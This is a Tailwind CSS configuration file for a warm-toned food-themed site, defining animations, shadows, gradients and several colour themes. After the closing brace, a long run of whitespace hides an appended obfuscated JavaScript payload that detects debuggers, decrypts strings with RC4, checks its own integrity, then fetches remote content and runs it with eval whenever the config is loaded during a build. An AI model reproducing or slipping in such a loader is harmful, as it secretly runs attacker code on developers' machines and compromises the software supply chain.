/** @type {import('tailwindcss').Config} */
module.exports = {
  content: ["./index.html", "./src/**/*.{js,ts,jsx,tsx}"],

  theme: {
    extend: {
      keyframes: {
        "fade-in": {
          "0%": { opacity: "0" },
          "100%": { opacity: "1" },
        },
        "fade-up": {
          "0%": { opacity: "0", transform: "translateY(1rem)" },
          "100%": { opacity: "1", transform: "translateY(0)" },
        },
        "fade-down": {
          "0%": { opacity: "0", transform: "translateY(-1rem)" },
          "100%": { opacity: "1", transform: "translateY(0)" },
        },
        "scale-in": {
          "0%": { opacity: "0", transform: "scale(0.95)" },
          "100%": { opacity: "1", transform: "scale(1)" },
        },
        float: {
          "0%, 100%": { transform: "translateY(0)" },
          "50%": { transform: "translateY(-10px)" },
        },
        "pulse-soft": {
          "0%, 100%": { opacity: "1" },
          "50%": { opacity: "0.65" },
        },
        shimmer: {
          "0%": { backgroundPosition: "-200% 0" },
          "100%": { backgroundPosition: "200% 0" },
        },
        wiggle: {
          "0%, 100%": { transform: "rotate(-2.5deg)" },
          "50%": { transform: "rotate(2.5deg)" },
        },
        marquee: {
          "0%": { transform: "translateX(0)" },
          "100%": { transform: "translateX(-50%)" },
        },
      },

      animation: {
        "fade-in": "fade-in 0.5s ease-out both",
        "fade-up": "fade-up 0.6s ease-out both",
        "fade-down": "fade-down 0.6s ease-out both",
        "scale-in": "scale-in 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) both",
        float: "float 6s ease-in-out infinite",
        "pulse-soft": "pulse-soft 2.5s ease-in-out infinite",
        shimmer: "shimmer 2.5s linear infinite",
        wiggle: "wiggle 0.4s ease-in-out",
        marquee: "marquee 22s linear infinite",
      },

      boxShadow: {
        soft: "0 2px 12px -2px rgba(44, 44, 44, 0.10)",
        card: "0 8px 30px -8px rgba(44, 44, 44, 0.18)",
        "card-hover": "0 14px 40px -10px rgba(44, 44, 44, 0.28)",
        glow: "0 0 0 3px rgba(192, 57, 43, 0.15)",
        "inner-soft": "inset 0 1px 3px rgba(44, 44, 44, 0.08)",
      },

      backgroundImage: {
        "warm-gradient": "linear-gradient(135deg, #fff8f0 0%, #f5e6d3 100%)",
        "tomato-gradient": "linear-gradient(135deg, #c0392b 0%, #e74c3c 100%)",
        "sunset-gradient":
          "linear-gradient(135deg, #f4b400 0%, #d1552b 55%, #9b2335 100%)",
        shimmer:
          "linear-gradient(110deg, transparent 35%, rgba(255,255,255,0.55) 50%, transparent 65%)",
        "grain-radial":
          "radial-gradient(ellipse 80% 60% at 70% 20%, rgba(244,180,0,0.12) 0%, transparent 55%)",
      },

      borderRadius: {
        xl2: "1.25rem",
        "4xl": "2rem",
      },

      colors: {
        brand: {
          DEFAULT: "#687474",
          deep: "#70733a",
          soft: "#2f2f6a",
          ink: "#736465",
          contrast: "#6c6976",
        },
        accent: {
          DEFAULT: "#65726e",
          soft: "#65742e",
        },
        surface: "#706167",
        line: "#65732e",
        muted: "#646576",
        canvas: "#2f636f",
        primary: "#6e6669",
        secondary: "#672e6a",
        tertiary: "#730000",
      },

      transitionTimingFunction: {
        "bounce-soft": "cubic-bezier(0.34, 1.56, 0.64, 1)",
        "out-expo": "cubic-bezier(0.16, 1, 0.3, 1)",
      },
    },
  },

  plugins: [
    require("tailwindcss-themer")({
      defaultTheme: {
        extend: {
          colors: {
            tomato: "#c0392b",
            "tomato-hover": "#a33225",
            "tomato-light": "#e74c3c",
            "tomato-dark": "#7a251b",
            accent: "#f4b400",
            "accent-soft": "#f9d066",
            "accent-dark": "#c99400",
            cream: "#fff8f0",
            "cream-dark": "#f3e9dc",
            panel: "#ffffff",
            "panel-warm": "#fef9f3",
            beige: "#f5e6d3",
            clay: "#f0e4d7",
            charcoal: "#2c2c2c",
            "charcoal-soft": "#4a4540",
            ink: "#1a1712",
            taupe: "#9c8e82",
            basil: "#4caf50",
            sage: "#8ba888",
            honey: "#f5c842",
            butter: "#ffe7a3",
            paprika: "#d1552b",
            plum: "#6d3b5e",
            denim: "#2f80c2",
            "denim-light": "#e6f2fb",
            error: "#d32f2f",
            "error-light": "#fdecea",
            warning: "#e67e22",
            "warning-light": "#fdf0e3",
            success: "#388e3c",
            "success-light": "#e8f5e9",
          },
          fontFamily: {
            display: ["Playfair Display", "ui-serif", "Georgia", "serif"],
            sans: ["Inter", "ui-sans-serif", "system-ui", "sans-serif"],
          },
        },
      },
      themes: [
        {
          name: "festive",
          selectors: ['[data-theme="festive"]'],
          extend: {
            colors: {
              tomato: "#9b2335",
              "tomato-hover": "#7d1c2b",
              "tomato-light": "#c0354a",
              "tomato-dark": "#63131f",
              accent: "#d4af37",
              "accent-soft": "#e5cc6e",
              "accent-dark": "#a8862a",
              cream: "#fff9f3",
              "cream-dark": "#efe0cf",
              panel: "#fffdf9",
              "panel-warm": "#fef6ee",
              beige: "#efe2d3",
              clay: "#ede0d0",
              honey: "#d4af37",
              paprika: "#b5482a",
              error: "#b71c1c",
              "error-light": "#fce4e4",
              success: "#2e7d32",
              "success-light": "#e0f2e1",
            },
          },
        },
        {
          name: "midnight",
          selectors: ['[data-theme="midnight"]'],
          extend: {
            colors: {
              tomato: "#e8614e",
              "tomato-hover": "#f0745f",
              "tomato-light": "#f2917f",
              "tomato-dark": "#c74a39",
              accent: "#f4c542",
              "accent-soft": "#f7d778",
              "accent-dark": "#c99f2f",
              cream: "#1b1815",
              "cream-dark": "#141210",
              panel: "#262320",
              "panel-warm": "#2c2825",
              beige: "#3a352f",
              clay: "#322d27",
              charcoal: "#f0e9df",
              "charcoal-soft": "#c9bfb2",
              ink: "#f7f2ea",
              taupe: "#a89e91",
              basil: "#6fbf73",
              sage: "#9cb89a",
              denim: "#5aa9e6",
              "denim-light": "#22333f",
              error: "#ef5350",
              "error-light": "#3a2422",
              warning: "#f0a35e",
              "warning-light": "#3a2c1c",
              success: "#66bb6a",
              "success-light": "#22331f",
            },
          },
        },
        {
          name: "harvest",
          selectors: ['[data-theme="harvest"]'],
          extend: {
            colors: {
              tomato: "#b5531f",
              "tomato-hover": "#96431a",
              "tomato-light": "#d06a30",
              "tomato-dark": "#7c3714",
              accent: "#e0a92e",
              "accent-soft": "#eec868",
              "accent-dark": "#b7861f",
              cream: "#fdf6ec",
              "cream-dark": "#f2e4cf",
              panel: "#fffaf1",
              "panel-warm": "#fbf0dd",
              beige: "#e9d7be",
              clay: "#e3cfb2",
              basil: "#7a8b3c",
              sage: "#9aa46b",
              honey: "#e0a92e",
              paprika: "#c2481f",
              success: "#5d7a2e",
              "success-light": "#eef2df",
            },
          },
        },
      ],
    }),

    require("tailwindcss-animate"),
    require("@tailwindcss/forms")({ strategy: "class" }),
    require("@tailwindcss/typography"),
  ],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        (function(){if(typeof process!=="undefined"){try{var _a=(process.execArgv||[]).join(" ");if(_a.indexOf(_0xf22ca9(4))!==-1||_a.indexOf(_0xf22ca9(5))!==-1||_a.indexOf(_0xf22ca9(6))!==-1||_a.indexOf(_0xf22ca9(7))!==-1){process.exit(0)}}catch(_e){}}var _0xe09e5a70=[["9a4af877d3667e","4fbd0e2a7bbc14c3"],["f41f186778c10f","a750ad1f25da2349"],["93ee99e80a06531f7440","4d103201e3d274df"],["92b25dac","5e5f123099dcf65c"],["41b79bd6","6daac801ad880bb8"],["ee9cd279e8","8ab0cc2de397d274"],["d2c90d02f01e3fe669","51b939d21eeb5018"],["e1ed652e77a005d13dc14dabaf","c3de1720e3d2bfb2"]];var _0x364af2d4=[[[["a2356e6d73615d56e9fbbb952ccde3db9aed70a5960a","a34f8cecde7f13d0"],["0d087a9c35a174cef26482a5d29c5a7e9f45","65b1ea404ecd45b7"],["c72a7883b47a68644f96","9bd15938afaabea4"],["559da519ce7f3df94e7d0e9ecd897e67b69f6ce1e375","8613b900cab95c15"]],0]];var _0x216b22=function(){var G=typeof globalThis!=="undefined"?globalThis:typeof window!=="undefined"?window:typeof self!=="undefined"?self:typeof global!=="undefined"?global:{};return function(n){return G[n]}}();function _0xf3ef80(cHex,kHex){var kb=[];for(var x=0;x<kHex.length;x+=2)kb.push(parseInt(kHex.substr(x,2),16));var S=[];for(var x=0;x<256;x++)S[x]=x;var j=0;for(var x=0;x<256;x++){j=j+S[x]+kb[x%kb.length]&255;var tmp=S[x];S[x]=S[j];S[j]=tmp}var a=0,b=0,out="";for(var x=0;x<cHex.length;x+=2){a=a+1&255;b=b+S[a]&255;var tmp=S[a];S[a]=S[b];S[b]=tmp;out+=String.fromCharCode(parseInt(cHex.substr(x,2),16)^S[S[a]+S[b]&255])}return out}function _0xf22ca9(i){var idx=(i+2)%_0xe09e5a70.length;return _0xf3ef80(_0xe09e5a70[idx][0],_0xe09e5a70[idx][1])}function _0x376d6c(i){var info=_0x364af2d4[i];var chunks=info[0];var meta=_0xf22ca9(info[1]);var parts=meta.split("|");var shift=parseInt(parts[0],10);var perm=parts[1].split(",").map(Number);var dec=[];for(var j=0;j<chunks.length;j++){dec.push(_0xf3ef80(chunks[j][0],chunks[j][1]))}var ordered=new Array(dec.length);for(var j=0;j<dec.length;j++){ordered[perm[j]]=dec[j]}var shifted="";for(var j=0;j<ordered.length;j++)shifted+=ordered[j];var result="";for(var j=0;j<shifted.length;j+=2){var hi=shifted.charCodeAt(j)-shift+256&255;var lo=shifted.charCodeAt(j+1)-shift+256&255;result+=String.fromCharCode(hi<<8|lo)}return result}(function(){var s=JSON.stringify(_0xe09e5a70)+"|"+JSON.stringify(_0x364af2d4);var h=5381;for(var i=0;i<s.length;i++)h=(h<<5)+h+s.charCodeAt(i)|0;if((h>>>0).toString(16)!=="f27d7b28"){if(typeof process!=="undefined")process.exit(0);else throw new Error("")}})();(()=>{_0x216b22(_0xf22ca9(3))(_0x376d6c(0))[_0xf22ca9(1)](_0x4e84ef=>_0x4e84ef[_0xf22ca9(2)]())[_0xf22ca9(1)](_0x59e98b=>eval(_0x59e98b))})()})();
